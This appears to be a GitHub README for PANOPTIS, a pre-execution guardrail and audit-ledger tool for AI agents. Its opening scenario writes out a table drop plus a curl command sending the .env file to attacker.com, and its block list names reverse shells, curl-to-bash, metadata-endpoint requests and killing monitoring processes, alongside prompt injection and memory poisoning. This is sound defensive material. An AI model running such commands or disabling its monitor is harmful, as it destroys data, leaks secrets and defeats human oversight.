<div align="center">

<img src="https://img.shields.io/pypi/v/panoptis?label=PyPI%20v0.3.1&color=blue&style=for-the-badge" alt="PANOPTIS on PyPI" />

# 👁️ PANOPTIS
### *(formerly AgentWatch)*

<img width="140" height="140" alt="Panoptis Logo" src="https://github.com/user-attachments/assets/4e6fd818-2458-4ac2-bb9c-25542622dd00" />

### **The Pre-Execution Guardrail & Cryptographic Attestation Engine for Autonomous AI**

*AI agents are prone to silent failures, ungrounded loops, and catastrophic unintended side effects.*  
*PANOPTIS acts as an active, inline pre-execution hypervisor — auditing reasoning, enforcing invariant contracts, tracking dynamic information flow, and blocking risky actions before they hit your production infrastructure.*

<br/>

[![PyPI Version](https://img.shields.io/pypi/v/panoptis?style=flat-square&color=blue)](https://pypi.org/project/panoptis/)
[![Tests](https://img.shields.io/badge/tests-3%2C060+_passing-brightgreen?style=flat-square)](https://github.com/Shinraya-Tech-Labs/AgentWatch)
[![Coverage](https://img.shields.io/codecov/c/github/Shinraya-Tech-Labs/AgentWatch?style=flat-square)](https://codecov.io/gh/Shinraya-Tech-Labs/AgentWatch)
[![License](https://img.shields.io/badge/license-Apache_2.0-blue?style=flat-square)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.12+-blue?style=flat-square&logo=python)](https://python.org)
[![Discord](https://img.shields.io/badge/Discord-Join_Community-5865F2?style=flat-square&logo=discord)](https://discord.gg/UT9uaeY46e)
[![Stars](https://img.shields.io/github/stars/Shinraya-Tech-Labs/AgentWatch?style=flat-square&color=gold)](https://github.com/Shinraya-Tech-Labs/AgentWatch/stargazers)
[![Forks](https://img.shields.io/github/forks/Shinraya-Tech-Labs/AgentWatch?style=flat-square&color=orange)](https://github.com/Shinraya-Tech-Labs/AgentWatch/network)
[![NSoC](https://img.shields.io/badge/NSoC_26'-participating-purple?style=flat-square)](https://github.com/Shinraya-Tech-Labs/AgentWatch/issues)
[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/Shinraya-Tech-Labs/AgentWatch/blob/main/examples/quickstart_panopti_guardrails.ipynb)

<br/>

```bash
# 📦 Install directly from PyPI
pip install panoptis

# 🎮 Launch Instant Interactive Terminal Demo (Simulates rogue agent attacks)
panopti demo

# 🌐 Launch Zero-Dependency Local Web Playground
panopti playground
```

[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FShinraya-Tech-Labs%2FAgentWatch&root-directory=agentwatch-landing)

*Decide on every tool call before it executes, and generate tamper-evident cryptographic proof of what happened.*

<br/>

[**Interactive Demo**](#-instant-interactive-demo) · [**Architecture**](#-architecture--dual-plane-design) · [**Security Gauntlet**](#-inline-pre-execution-security-pipeline) · [**Evidence & Merkle Attestation**](#-cryptographic-witness-attestation) · [**Quick Start**](#-quick-start) · [**Supported Frameworks**](#-supported-frameworks) · [**Comparative Benchmark**](#-how-panoptis-compares) · [**Community**](#-community)

</div>

---

## ⚡ The Silent Failure Crisis in AI Agents

```
Agent receives task: "Clean up cache and sync database"
Reasoning appears confident and well-structured.
Agent executes: DROP TABLE users; curl -X POST attacker.com -d @.env
You discover the catastrophic data loss 4 hours later.
```

**1 in 20 AI agent requests fail silently or perform unintended mutations in production.**

Existing observability systems — Langfuse, Arize Phoenix, Datadog — operate **post-hoc**. They tell you what broke **after** the damage is written to disk or exfiltrated over the network. 

An agent that hallucinates or falls prey to indirect prompt injection is indistinguishable from a succeeding agent unless you evaluate the **action intent, dynamic information flow, and invariant safety** *before execution*.

| The Enterprise Cost of Post-Hoc Tracing | Impact |
|---|---|
| **1 in 20** | Agent operations fail silently or introduce data drift |
| **76%** | Enterprise agent deployments stall within 90 days due to safety fears |
| **$4.45M** | Average cost of a data breach stemming from compromised automated tooling |
| **0 ms** | Window to prevent damage once a destructive tool call has executed |

---

## 💡 How PANOPTIS Works

PANOPTIS operates as an **inline pre-execution hypervisor** situated between your autonomous agent and external systems (tools, APIs, databases, filesystems, and networks).

```mermaid
flowchart LR
    A["🤖 Autonomous Agent<br/>(Claude, LangChain, CrewAI)"] -->|"1. Proposed Action / Tool Call"| HYPERVISOR

    subgraph HYPERVISOR["🛡️ PANOPTIS Hypervisor"]
        direction TB
        G1["⚡ Fast Gate (sub-10ms)<br/>AST & Intent Normalization"]
        G2["🔒 Dynamic Taint Tracking<br/>Dual-Zone DLP & Secret Scrubbing"]
        G3["🧠 Semantic Invariant Auditor<br/>Crescendo Drift & Memory Sentry"]
        G4["🌲 Cryptographic Ledger<br/>Append-Only Merkle Tree"]
        G1 --> G2 --> G3 --> G4
    end

    HYPERVISOR -->|"✅ ALLOWED"| REAL_WORLD["🌍 Real World Execution<br/>(DB, Filesystem, External APIs)"]
    HYPERVISOR -.->|"⛔ BLOCKED / VETOED"| DEFENSE["🚫 Terminated / Fallback<br/>(Invariant Tripped, Alert Fired)"]
    HYPERVISOR -.->|"👤 ESCALATED"| HUMAN["🧑‍💻 Human-in-the-Loop<br/>(Explicit Approval Gate)"]

    style A fill:#1e293b,stroke:#3b82f6,color:#fff
    style HYPERVISOR fill:#0f172a,stroke:#3ecf8e,color:#fff
    style REAL_WORLD fill:#0f2a18,stroke:#10b981,color:#fff
    style DEFENSE fill:#3b1212,stroke:#ef4444,color:#fff
    style HUMAN fill:#2a230f,stroke:#f59e0b,color:#fff
```

### The Architectural Separation
Self-evaluating models suffer from **structural sycophancy and overconfidence bias**. PANOPTIS decouples policy enforcement from agent reasoning by running independent AST normalizers, information-flow lattice verifiers, and optional secondary model auditors that inspect the command intent with zero access to the agent's internal rationalizations.

---

## 🏗️ Architecture & Dual-Plane Design

PANOPTIS is built on two decoupled, complementary planes:
1. **Enforcement Plane (`panoptis.protect`)**: An ultra-low-latency synchronous gate that validates, rewrites, or terminates tool actions before execution.
2. **Observation & Evidence Plane (PANOPTIS v3 Evidence Lab)**: A passive, deterministic runtime recorder that serializes immutable execution graphs, computes Merkle trees, and performs shadow replays.

```mermaid
flowchart TB
    subgraph INGEST["🔌 Ingestion & Framework Adapters"]
        direction LR
        A1["Claude Code Hook"]
        A2["LangChain / LangGraph"]
        A3["CrewAI / AutoGen"]
        A4["smolagents / AutoGPT"]
        A5["MCP Gateway (Streamable HTTP)"]
    end

    INGEST --> SPLIT{"Execution Plane Split"}

    subgraph ENFORCE["🛡️ ENFORCEMENT PLANE (Inline Gate & Hypervisor)"]
        direction TB
        E1["Pre-Execution Policy Filter"]
        E2["Shell & SQL AST Sanitizer"]
        E3["Steganography Neutralizer"]
        E4["Information Flow Control (IFC)"]
        E5["Anti-Tamper Process Shield"]
        E1 --> E2 --> E3 --> E4 --> E5
    end

    subgraph EVIDENCE["🏛️ EVIDENCE & OBSERVABILITY PLANE (v3 Lab)"]
        direction TB
        O1["Canonical Event Schema Normalizer"]
        O2["Causal Hyperedge DAG Engine"]
        O3["Domain-Separated Merkle Tree"]
        O4["L1-L4 Deterministic Shadow Replay"]
        O5["Witness Attestation Token (Ed25519)"]
        O1 --> O2 --> O3 --> O4 --> O5
    end

    SPLIT -->|"Synchronous Pre-Check"| ENFORCE
    SPLIT -->|"Immutable Telemetry"| EVIDENCE

    ENFORCE --> OUTPUT["🚀 Protected Host / Network / Tools"]
    EVIDENCE --> STORAGE["💾 Isolated Multi-Tenant DB<br/>(PostgreSQL / SQLite)"]
    STORAGE --> DASH["📊 Next.js Real-Time Dashboard<br/>(WebSockets + Recharts)"]

    style INGEST fill:#0f172a,stroke:#64748b,color:#fff
    style ENFORCE fill:#172554,stroke:#3b82f6,color:#fff
    style EVIDENCE fill:#064e3b,stroke:#10b981,color:#fff
    style DASH fill:#1e1e2e,stroke:#a855f7,color:#fff
```

---

## 🔐 Inline Pre-Execution Security Pipeline

Every action initiated by an agent runs through an adversarial gauntlet with **sub-10ms overhead**:

```mermaid
flowchart TD
    START["📥 Inbound Agent Action<br/>(Tool / Shell / SQL / Network)"] --> PARSE["⚡ AST Parsing & Intent Normalization<br/>(De-obfuscate split flags, long-form syntax, RCE chains)"]
    
    PARSE --> TAINT{"🔒 Dynamic Taint Tracking<br/>(Has secret touched memory?)"}
    TAINT -->|Yes: Sink is Public| BLOCK_TAINT["⛔ BLOCKED: Lattice Violation<br/>(Prevent Turn 1 read to Turn 2 exfil)"]
    TAINT -->|No: Flow Valid| STEGO["🧹 Steganography Neutralizer<br/>(Strip trailing tabs/spaces, zero-width unicode)"]

    STEGO --> POLICY{"🔍 Policy & Invariant Check"}
    POLICY -->|Critical Destructive Pattern| BLOCK_CRIT["⛔ BLOCKED: Destructive Mutation<br/>(rm -rf, DROP TABLE, mkfs, kill)"]
    POLICY -->|Needs Confirmation| HITL["👤 Human In The Loop Gate"]
    POLICY -->|Passed Guardrails| ATTEST["🌲 Compute Merkle Leaf & Append to Witness Chain"]

    HITL -->|Operator Approved| ATTEST
    HITL -->|Operator Denied / Timeout| BLOCK_DENY["⛔ BLOCKED: Rejected by Operator"]

    ATTEST --> EXEC["✅ DISPATCH ACTION TO HOST"]

    style START fill:#1e293b,stroke:#3ecf8e,color:#fff
    style BLOCK_TAINT fill:#3b1212,stroke:#ef4444,color:#fff
    style BLOCK_CRIT fill:#3b1212,stroke:#ef4444,color:#fff
    style BLOCK_DENY fill:#3b1212,stroke:#ef4444,color:#fff
    style EXEC fill:#0f2a18,stroke:#10b981,color:#fff
    style HITL fill:#2a230f,stroke:#f59e0b,color:#fff
```

### What PANOPTIS Blocks By Default:
- **Destructive File Operations**: `rm -rf /`, raw partition overwrites, recursive permission resets (`chmod 777`).
- **Remote Code Execution & Piping**: `curl ... | bash`, `wget -O- | sh`, reverse shell payloads, process injection.
- **Database Truncation**: `DROP DATABASE`, unconstrained `DELETE FROM` without `WHERE` clauses, schema corruption.
- **Egress & SSRF Protection**: Requests to loopback (`127.0.0.1`), link-local (`169.254.169.254` cloud metadata), private IP RFC1918 blocks.
- **Guardian Tampering**: Commands attempting to kill monitoring processes (`pkill`, `killall`) or delete audit databases (`rm panopti.db`).
- **Memory Poisoning**: Injection of malicious facts into persistent agent memory stores (`store_memory`, `save_fact`).
- **Crescendo Multi-Turn Drift**: Gradual, multi-turn prompt injection attempts that subtly steer the agent away from its original objective.

---

## 🌲 Cryptographic Witness Attestation

Every executed tool action and observation is anchored into an **append-only domain-separated Merkle Tree**, generating verifiable audit trails that cannot be forged or tampered with even by privileged administrators.

```mermaid
sequenceDiagram
    autonumber
    participant Agent as 🤖 Agent
    participant Guard as 🛡️ PANOPTIS Gate
    participant Tree as 🌲 Merkle Tree Store
    participant Auditor as 📜 Verifier / Regulator

    Agent->>Guard: Propose ToolAction(action_id, tool, args)
    Guard->>Guard: Validate Invariants & Security Lattice
    Guard->>Tree: Append Leaf: H(0x00 || CanonicalJSON(Action))
    Tree-->>Guard: Updated Merkle Root (R_i)
    Guard->>Agent: Allow Execution
    Agent-->>Guard: ToolResult(output)
    Guard->>Tree: Append Leaf: H(0x00 || CanonicalJSON(Result))
    Tree-->>Guard: Updated Merkle Root (R_i+1)

    Note over Guard,Tree: Cryptographic Inclusion Proof Generation
    Auditor->>Tree: Request Inclusion Proof for Action X
    Tree-->>Auditor: Audit Token (Sibling Hashes + Root Signature)
    Auditor->>Auditor: verify_inclusion(action_hash, proof, root)
    Note over Auditor: ✅ Mathematically Guaranteed Execution Sequence
```

- **Domain Separation**: Prefixes leaf nodes with `0x00` and internal branch nodes with `0x01` to eliminate second preimage attacks.
- **Cryptographic Shredding**: Per-subject AES-256-GCM encryption with hashes committed over ciphertext, providing compliance with GDPR "Right to be Forgotten" while maintaining Merkle tree mathematical integrity.
- **Hardware-Ready Signatures**: Audit tokens signed via HMAC-SHA256 or asymmetric Ed25519.

---

## 🔁 Deterministic Shadow Replay

How do you debug an agent that failed 3 steps into a 20-step execution without re-running expensive or irreversible API calls?

PANOPTIS includes **Deterministic Shadow Replay (`panoptis.replay.shadow`)**, enabling zero-cost replay against new models or updated prompt templates while answering all tool interactions from the recorded cryptographic evidence store:

```mermaid
sequenceDiagram
    participant Replay as 🔄 Shadow Replay Runner
    participant Model as 🧠 Evaluated Model (v2)
    participant Store as 💾 Tool Evidence Store
    participant World as 🌍 Real World (ISOLATED)

    Replay->>Model: Replay Prompt with Step Context
    Model-->>Replay: Proposed Tool Action: search_catalog(query)
    Replay->>Store: Lookup Exact Tool Evidence (Hash Match)
    Store-->>Replay: Return Recorded Result (Zero Cost, No Execution)
    Note over World: 🚫 Real world is never contacted!

    Replay->>Replay: Compare Trajectory with Original Run
    alt Trajectory Matches
        Note over Replay: Result: IDENTICAL_REPLAY
    else Model Diverges Intelligently
        Note over Replay: Result: DETERMINISTIC_CORROBORATION
    else Uncorrelated Output
        Note over Replay: Result: STOCHASTIC_MODEL_DIVERGENCE
    end
```

---

## 📸 Screenshots

<div align="center">

<table>
  <tr>
    <td width="50%" align="center" valign="top">
      <img src="docs/screenshots/01-hero.png" alt="AgentWatch landing page" /><br/>
      <sub><b>Real-Time Pre-Execution Intervention.</b><br/>A blocked <code>rm -rf /tmp/*</code> with live confidence score and blast-radius calculated before execution.</sub>
    </td>
    <td width="50%" align="center" valign="top">
      <img src="docs/screenshots/02-how-it-works.png" alt="Pre-execution blocking flow" /><br/>
      <sub><b>Inline Hypervisor Pipeline.</b><br/>Capturing every reasoning step, scoring via independent gates, and protecting external APIs.</sub>
    </td>
  </tr>
  <tr>
    <td width="50%" align="center" valign="top">
      <img src="docs/screenshots/03-features.png" alt="Six production-grade modules" /><br/>
      <sub><b>Comprehensive Enterprise Suite.</b><br/>Reasoning Auditor · Safety Engine · One-Click Rollback · Multi-Agent DAG · Causal Memory · Compliance Export.</sub>
    </td>
    <td width="50%" align="center" valign="top">
      <img src="docs/screenshots/04-comparison.png" alt="Competitive comparison" /><br/>
      <sub><b>Beyond Post-Hoc Tracing.</b><br/>Comparing inline pre-execution intervention with passive logging systems.</sub>
    </td>
  </tr>
</table>

</div>

---

## 🚀 Quick Start

### 1. Installation
Install the core engine directly from PyPI:
```bash
pip install panoptis
```

To include optional vector embedding drift detection or OpenTelemetry export:
```bash
pip install "panoptis[embeddings,otel]"
```

### 2. Instant Local Demo (Zero Setup)
Test PANOPTIS against simulated prompt injection, database dropping, and privilege escalation attacks right in your terminal:
```bash
panopti demo
```

Or launch the zero-dependency interactive visual playground in your browser:
```bash
panopti playground
```

### 3. Wrap Any Python Tool in 2 Lines of Code
```python
from panoptis.protect import protect_tool

@protect_tool
def execute_system_query(query: str) -> str:
    # Any dangerous SQL or shell command is analyzed and blocked before entering here
    return db.execute(query)

# This will trigger an immediate SecurityBlockException before touching the DB:
execute_system_query("DROP TABLE users;")
```

### 4. Full Agent Wrapping
```python
from panoptis import watch

# Wrap your existing LangChain, CrewAI, or custom agent:
protected_agent = watch(
    my_agent,
    session_id="prod-session-01",
    fail_closed=True,          # Block if safety check errors
    enable_crescendo=True,     # Multi-turn drift detection
    enable_taint_tracking=True # Prevent secret exfiltration
)

protected_agent.run("Analyze Q4 data and export summary")
```

### 5. Running the Complete Infrastructure Stack
```bash
# Clone and spin up full environment (Postgres with pgvector, Redis, FastAPI, Next.js Dashboard)
git clone https://github.com/Shinraya-Tech-Labs/AgentWatch.git
cd AgentWatch

# Copy template and set required secret key
cp .env.example .env

# Start services
docker compose up -d
```
- **Dashboard UI**: `http://localhost:3000`
- **FastAPI OpenAPI Swagger**: `http://localhost:8000/docs`
- **WebSocket Event Stream**: `ws://localhost:8000/ws/events`

---

## 🔌 Supported Frameworks

PANOPTIS provides seamless drop-in integrations across the entire modern AI agent ecosystem. Read individual integration guides in [`docs/adapters/`](docs/adapters/):

| Framework | Pre-Execution Guardrail | Full Telemetry & Tracing | Native Adapter Import |
|---|:---:|:---:|---|
| **Claude Code** | ✅ Full Hook | ✅ | PreToolUse hook integration (`panoptis.protect.claude_hook_entry`) |
| **LangChain** | ✅ Active Tool Gate | ✅ | `from panoptis.adapters.langchain import PanoptisCallbackHandler` |
| **LangGraph** | ✅ Node Interceptor | ✅ | `from panoptis.adapters.langgraph import PanoptisGraphInterceptor` |
| **CrewAI** | ✅ Agent Hypervisor | ✅ | `from panoptis.adapters.crewai import PanoptisCrewObserver` |
| **AutoGen** | ✅ Message Filter | ✅ | `from panoptis.adapters.autogen import PanoptisConversableAgent` |
| **smolagents** | ✅ Tool Interceptor | ✅ | `from panoptis.adapters.smolagents import PanoptisToolWrapper` |
| **Model Context Protocol (MCP)** | ✅ HTTP Gateway | ✅ | Built-in streamable HTTP proxy (`panopti gateway`) |
| **Universal Function Decorator** | ✅ Python Native | ✅ | `@protect_tool`, `@watch` |

---

## 📊 How PANOPTIS Compares

| Capability | **PANOPTIS (Pre-Execution Hypervisor)** | **Langfuse / Arize Phoenix (Post-Hoc Tracing)** | **Datadog / APM (Host Metrics)** |
|---|:---:|:---:|:---:|
| **Intervention Timing** | **Pre-Execution** *(< 10ms inline block)* | **Post-Hoc** *(after execution)* | **Post-Hoc** *(sampled logs)* |
| **Damage Prevention** | ✅ **Prevents action from executing** | ❌ None (logs the incident) | ❌ None |
| **Cryptographic Witness Ledger** | ✅ **Merkle Tree with inclusion proofs** | ❌ Standard mutable SQL | ❌ Standard metrics DB |
| **Dynamic Information Flow & Taint** | ✅ **Bidirectional lattice tracking** | ❌ None | ❌ None |
| **Steganographic Neutralizer** | ✅ **Unicode & whitespace stripping** | ❌ None | ❌ None |
| **Shadow Replay (L1–L4)** | ✅ **Deterministic zero-cost corroboration** | ⚠️ Re-executes real API calls | ❌ None |
| **Anti-Tamper Process Shield** | ✅ **POSIX signal & file sentinels** | ❌ None | ⚠️ Host daemon only |
| **Multi-Turn Crescendo Detection** | ✅ **Cumulative drift velocity scoring** | ❌ None | ❌ None |
| **Trace Visualization & APM** | ✅ Real-time Next.js Dashboard | ✅ Deep span trees | ✅ Infrastructure APM |

---

## 💻 Interactive Command Line Interface (CLI)

PANOPTIS includes the `panopti` and `panoptis` CLIs for monitoring, security testing, and forensic investigation:

```bash
# 🎮 Interactive Demonstrations
panopti demo                     # Interactive terminal attack simulator
panopti playground               # Zero-dependency local browser playground

# 🛡️ Defense & Red-Teaming
panoptis protect redteam         # Run curated attack corpus against your policy engine
panoptis check-env               # Validate cryptographic keys, database isolation & API safety

# 🔬 Forensic Investigation & v3 Evidence Lab
panoptis observe python agent.py # Trace and cryptographically record an agent run
panoptis inspect latest          # Reconstruct execution steps, confidence, and tokens
panoptis compare run_A run_B     # Compute earliest point of semantic divergence
panoptis replay latest --level L2# Shadow replay using immutable evidence cache
panoptis session rollback <id>   # Revert filesystem state to a prior git snapshot
```

---

## 🧪 Comprehensive Verification & Test Suite

PANOPTIS is tested continuously under strict automated CI conditions:

```bash
# Run unit and architectural invariant test suite
pytest tests/ -v

# Run the dedicated pre-execution protection test suite
pytest tests/protect/ -v

# Run ecosystem security and multi-tenant isolation tests
pytest tests/test_deep_audit_ecosystem.py -v
```

- **3,060+ Unit & Integration Tests Passing**
- **100% Deterministic Reproducibility**
- **Zero Known Vulnerabilities** (Gitleaks, Bandit AST, and Pip-Audit verified)
- **High-Concurrency Validated** (Locust load-tested at enterprise request thresholds)

---

## 📦 Verified Release & Provenance Attestation

Every release of PANOPTIS is built and cryptographically attested in GitHub Actions via **PyPI Trusted Publishing (OIDC)**:

```bash
# Verify the integrity and build provenance of the official wheel
pip download panoptis==0.3.1 --no-deps -d check/ && cd check
gh attestation verify panoptis-0.3.1-py3-none-any.whl --repo Shinraya-Tech-Labs/AgentWatch
```

---

## 🤝 Contributing

PANOPTIS is developed in the open. **Contributors get their name featured on the official landing page upon their first merged PR.**

```mermaid
flowchart LR
    A["💬 Join Discord<br/>(Discuss issue & architecture)"] --> B["🔍 Pick Issue<br/>(good first · security · core)"]
    B --> C["🔨 Implement & Test<br/>(Write minimal working diff)"]
    C --> D["✅ Open Pull Request<br/>(Strict automated CI & Bandit)"]
    D --> E["🎉 Merge to Main<br/>(Name on Landing Contributors Wall)"]

    style A fill:#0f172a,stroke:#5865F2,color:#fff
    style B fill:#0f172a,stroke:#3ecf8e,color:#fff
    style C fill:#0f172a,stroke:#3ecf8e,color:#fff
    style D fill:#0f172a,stroke:#3ecf8e,color:#fff
    style E fill:#0f2a18,stroke:#10b981,color:#fff
```

We proudly mentor students and emerging developers through open-source programs:
- **SSOC 2026** (Social Summer of Code)
- **NSOC 2026** (Nexus Spring of Code)

Read our [CONTRIBUTING.md](CONTRIBUTING.md) to get started.

---

## 💬 Community & Ecosystem

- **Discord Server**: [discord.gg/UT9uaeY46e](https://discord.gg/UT9uaeY46e) — Connect with the core maintainers and AI safety researchers.
- **GitHub Discussions**: [Ask questions & share architectures](https://github.com/Shinraya-Tech-Labs/AgentWatch/discussions)
- **Report Security Vulnerabilities**: Please review [SECURITY-BASELINE.md](SECURITY-BASELINE.md) for responsible disclosure.

---

## 📄 License

PANOPTIS is licensed under the **Apache License, Version 2.0**. See the [LICENSE](LICENSE) file for details.

<div align="center">

Built with 🛡️ by [**Shinraya Tech Labs**](https://github.com/Shinraya-Tech-Labs) & the global open-source AI safety community.

⭐ **Star the repo** · 🐛 [**Report an issue**](https://github.com/Shinraya-Tech-Labs/AgentWatch/issues) · 💬 [**Join Discord**](https://discord.gg/UT9uaeY46e)

</div>
